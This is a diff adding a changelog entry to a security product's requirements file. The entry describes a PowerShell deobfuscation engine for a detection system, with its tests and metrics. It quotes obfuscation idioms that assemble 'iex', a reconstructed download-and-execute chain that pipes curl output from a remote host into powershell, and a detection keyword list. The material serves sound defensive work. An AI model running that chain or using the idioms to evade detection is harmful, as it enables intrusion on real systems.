@@ -1,6 +1,96 @@
 # NivXRay — Master Reminders + Product Requirements
 
 
+## ✅ 2026-09-02 · P0-1B · Phase 2 · Gate 2C · SHIPPED (STOPPED FOR ACCEPTANCE)
+
+Owner-authorised Gate 2C — **PowerShell Plane-B semantic
+reconstruction**. Six new capabilities in a new
+`services/decoder/powershell.py` sub-engine, wired through the
+engine dispatcher and (transitively) through `canonicalize()`.
+Preceded by the Gate 2B evidence-surface verification: audited
+`decoder_bridge` — confirmed XDR-internal only (calls
+`services/die/preprocessor/recursive_decoder`, zero external
+runtime dependency).
+
+**Files created:**
+- `services/decoder/powershell.py` — 6 capabilities:
+  - `powershell.stdin_pipe`             — peels `echo … | powershell -c -`
+  - `powershell.char_array_assembly`    — folds `[char]105+[char]101+…`
+  - `powershell.format_string_assembly` — folds `'{1}{0}' -f 'ex','i'`
+  - `powershell.string_concat`          — folds `'ie'+'x'`
+  - `powershell.join_split_fold`        — folds `('i','e','x') -join ''`
+  - `powershell.variable_indirection`   — resolves `$a='iex'; &$a` etc.
+
+**Files modified:**
+- `services/decoder/registry.py`  — registers PS sub-engine alongside CMD.
+- `services/decoder/engine.py`    — dispatch now runs CMD first (if
+  signalled) then PS on the CMD-reconstructed payload so nested
+  chains peel completely. Broader PS heuristic (adds
+  `[char]`, `iwr`, `frombase64string`, `-join`, `-split`,
+  `-replace`, `&$`, format-string idioms, string-concat).
+- `services/decoder/__init__.py` + `services/decoder/cmd.py`
+  version bumped to `0.3.0-gate2c`.
+- `tests/decoder_harness/harness.py` — 8 new curated cases across
+  `ps-char-array`, `ps-format-string`, `ps-variable-indirection`,
+  `ps-stdin-pipe`, `ps-join-split`, `ps-string-concat` + 2 benign
+  PS admin cases.
+
+**Gate 2B evidence-surface verification (PASSED before starting 2C):**
+Ran `canonicalize(TOMMY_AA_LOL_RAW)` end-to-end. All 6 required Gate 2B layers surface in `decoded_layers` with `source="universal_decoder"`, `static_only=True`, `execution=False`, `attck_promotion=False` on every layer. Zero layers auto-promoted to malicious. `decoded_final` now carries the semantic reconstruction (`cmd.exe /c curl.exe https://tommy-aa.lol/f | powershell.exe cmd`). `decoded_iocs` now surfaces `https://tommy-aa.lol/f` post-reconstruction via re-scan.
+
+**Gate 2C testing (A→G harness):**
+- **29/29 semantic cases pass** across 22 categories.
+- **benign FP = 0** across all categories including the 2 new
+  PS-benign cases (`Get-Service`, `Get-Process` — no PS layer
+  fires spuriously).
+- **latency p50/p95/p99 = 0.030 / 0.074 / 0.184 ms**.
+- All 6 PS obfuscation categories 1/1 pass.
+
+**P0-1 corpus impact (Track C, honest):**
+| Metric | Baseline (P0-1A/2A/2B) | Post-2C | Δ |
+|---|---:|---:|---:|
+| verdict_accuracy | 0.9143 | 0.9143 | 0 |
+| ioc_recall       | 0.8947 | **0.9211** | **+0.0263** |
+| attck_recall     | 0.9088 | **0.9154** | **+0.0066** |
+| malicious FN     | [mal-20] | [mal-20] | 0 |
+| benign FP        | [] | [] | 0 |
+| surface_mal_f1   | 0.8929 | 0.8929 | 0 |
+
+**Honest gap (deferred to future gate):** 5 obf-* verdicts still
+mismatch expected MALICIOUS (obf-05/06/07/14/15). Root cause is
+NOT a reconstruction failure — the PS engine correctly reconstructs
+`'iex'` from `[char]105+[char]101+[char]120`, `'{1}{0}' -f 'ex','i'`,
+`'i'+'e'+'x'`, `&$a` where `$a='iex'`, and stdin-piped
+`Invoke-Expression`. The `test_scenario` verdict floor uses the P0-1A
+`_surface_verdict` MAL keyword list which looks for `iex(iwr`,
+`iex (iwr`, `DownloadString`, not the folded `'iex'` literal +
+`iwr` combination. Wiring the surface verdict to consume the
+reconstructed output is a distinct concern (proposed future
+Gate 2G · Surface-verdict wiring for reconstructed evidence),
+NOT a Gate 2C reconstruction gap. Reported honestly rather than
+tuning the runner to make it green — per owner rule "feature
+progress + product regression = reject" and "no fabricated
+evidence."
+
+**Adjacent test suites:** 32/32 green (decoder_bridge /
+intelligence_policy / phase2_final_gate). No new regressions.
+Harness total: 42/42 (9 gate tests + 29 semantic + 4 aggregate
+metric assertions inside test_corpus_aggregate).
+
+**Architecture invariants preserved end-to-end:**
+- static_only=True / execution=False / attck_promotion=False
+  (structurally enforced at `Provenance.__post_init__`)
+- DECODED ≠ EXECUTED
+- Provenance on every layer
+- Zero external runtime dependency
+- `decoder_bridge` audited: XDR-internal only, no external calls
+- Registry allow-list rejects DYNAMIC / UI / IRRELEVANT
+
+**STOPPED for owner acceptance of Gate 2C before Gate 2D
+(Plane-A codec expansion + Magic classifier) begins.**
+
+
+
 ## ✅ 2026-09-02 · P0-1B · Phase 2 · Gate 2B · SHIPPED (STOPPED FOR ACCEPTANCE)
 
 Owner-authorised Gate 2B — CMD `FOR /F` semantic reconstruction +
